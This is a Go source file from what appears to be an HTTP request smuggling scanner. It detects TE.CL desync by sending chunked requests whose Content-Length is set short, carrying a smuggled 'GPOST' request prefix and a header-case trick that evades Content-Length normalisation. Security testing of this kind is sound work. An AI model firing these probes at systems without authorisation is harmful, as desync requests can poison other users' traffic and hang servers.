package scan

// tecl.go — TE.CL desync detection.
//
// Strategy (ChunkContentScan.java TE.CL path):
//   The front-end reads chunked (Transfer-Encoding wins).
//   The back-end reads Content-Length bytes and stops mid-chunk,
//   leaving the remainder ("GPOST …") poisoning the next request.
//
// We set CL to point only at the chunk-size line (before the actual data),
// so the back-end considers the request complete after reading the size line,
// then interprets the smuggled prefix as a new request start — causing a hang.
//
// bypassCLFix lowercases "Content-Length" to prevent some middleware from
// normalising the duplicate CL header (mirrors bypassContentLengthFix in Java).

import (
	"fmt"
	"net/url"

	"github.com/smuggled/smuggled/pkg/permute"
	"github.com/smuggled/smuggled/pkg/report"
)

// ScanTECL iterates all H1 TE permutations looking for a TE.CL desync signal.
func ScanTECL(target *url.URL, base []byte, cfg Config, rep *report.Reporter) {
	workingBase, probeMethod := upgradeToBodyMethod(base, cfg, rep.Log)

	smuggledPrefix := fmt.Sprintf("GPOST / HTTP/1.1\r\nHost: %s\r\n\r\n", target.Hostname())
	chunkSize := len(smuggledPrefix)
	// CL points to just the size-line bytes (before the actual chunk data)
	cl := len(fmt.Sprintf("%x\r\n", chunkSize))
	body := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", chunkSize, smuggledPrefix)

	for _, tech := range filterTechniques(permute.H1Techniques(), cfg.TechniquesFilter) {
		if tech.H2Only {
			continue
		}

		mutated := permute.ApplyTE(workingBase, tech.Name)
		if mutated == nil {
			continue
		}
		mutated = addTE(mutated)
		mutated = setConnection(mutated, "close")

		probeReq := bypassCLFix(setContentLength(setBody(mutated, body), cl))

		rep.Log("TE.CL probe: technique=%s method=%s target=%s", tech.Name, probeMethod, target.Host)

		resp, _, timedOut, err := rawRequest(target, probeReq, cfg)
		if err != nil {
			rep.Log("TE.CL send error (%s): %v", tech.Name, err)
			continue
		}

		if timedOut {
			confirmed := confirmProbe(target, probeReq, cfg, rep.Log, "TE.CL")
			sev := report.SeverityProbable
			if confirmed {
				sev = report.SeverityConfirmed
			}
			rep.Emit(report.Finding{
				Target:      target.String(),
				Severity:    sev,
				Type:        "TE.CL",
				Technique:   tech.Name,
				Description: fmt.Sprintf("Front-end uses Transfer-Encoding; back-end uses Content-Length (method: %s)", probeMethod),
				Evidence:    fmt.Sprintf("timeout=true confirmed=%v", confirmed),
				RawProbe:    truncate(string(probeReq), 512),
				RawResponse: truncate(string(resp), 512),
			})
			return
		}
	}
}
